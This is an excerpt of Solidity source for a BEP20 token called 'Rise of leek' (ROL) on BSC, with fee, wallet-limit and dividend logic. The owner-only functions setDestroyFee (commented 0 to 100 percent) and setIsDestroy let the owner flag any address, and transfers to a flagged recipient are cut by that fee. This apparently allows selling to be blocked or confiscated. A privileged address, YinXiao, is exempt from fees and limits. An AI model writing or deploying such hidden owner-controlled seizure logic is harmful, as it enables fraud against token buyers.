...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 rewardsToken = IBEP20(0x2859e4544C4bB03966803b044A93563Bd2D0DD4D); // bsc BUSD
...
contract ROL is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address YinXiao =0x3447c1b26D9a30E7dB5199a89D76CeAbe2a756B6;

    string constant _name = "Rise of leek ";
    string constant _symbol = "ROL";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 10000000000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = (_totalSupply * 5) / 1000; 
	uint256 public _maxWalletToken = ( _totalSupply * 10 ) / 1000; // max wallet
    ...
    uint256 totalFee = 11; // just for this
    ...
    mapping (address => bool) isDestroyAddress;
    ...
    constructor () Auth(msg.sender) {
        ...
        isFeeExempt[YinXiao] = true;
        isTxLimitExempt[YinXiao] = true;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // 销毁部分
        if(isDestroyAddress[recipient]){
            uint256 destroyAmount = amount.mul(destroyFee).div(100);
            emit Transfer(sender, _destroyAddress, destroyAmount);
            if(destroyAmount < amountReceived){
                amountReceived =  amountReceived - destroyAmount;
            }
    ...
    // 设置百分比0 - 100以内的
    function setDestroyFee(uint256 _destroyFee) external authorized {
        destroyFee = _destroyFee;
    }

    function setAutoLiquidityFeeReceivers(address _autoLiquidityReceiver) external authorized {
    ...
    function setIsDestroy(address holder, bool isDestroy) external authorized {
        isDestroyAddress[holder] = isDestroy;
    }
    
    function getIsDestroy(address holder) public view returns (bool) {
       return isDestroyAddress[holder];
    }
